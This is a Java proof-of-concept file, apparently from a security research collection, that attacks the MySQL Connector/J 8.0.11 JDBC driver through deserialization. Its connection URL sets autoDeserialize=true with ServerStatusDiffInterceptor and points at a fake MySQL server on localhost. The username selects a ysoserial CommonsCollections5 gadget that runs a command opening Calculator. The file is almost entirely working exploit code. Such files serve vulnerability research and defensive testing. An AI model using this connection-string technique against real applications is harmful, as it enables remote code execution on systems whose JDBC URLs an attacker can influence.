package org.su18.jdbc.attack.mysql.serverstatus;

import org.su18.jdbc.attack.mysql.util.ConnectionUtil;

/**
 * 使用 https://github.com/fnmsd/MySQL_Fake_Server 进行测试
 * 依赖版本 8.0.11
 * 驱动名称 com.mysql.jdbc.Driver/com.mysql.cj.jdbc.Driver
 * 属性名 queryInterceptors
 * 连接参数 autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor
 *
 * @author su18
 */
public class Attack8x {

	public static void main(String[] args) throws Exception {

		String driverName    = "com.mysql.cj.jdbc.Driver";
		String connectionUrl = "jdbc:mysql://localhost:13308/whatever?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor";

		ConnectionUtil.getJDBCConnection(driverName, connectionUrl, "yso_CommonsCollections5_open -a Calculator.app", "");
	}

}
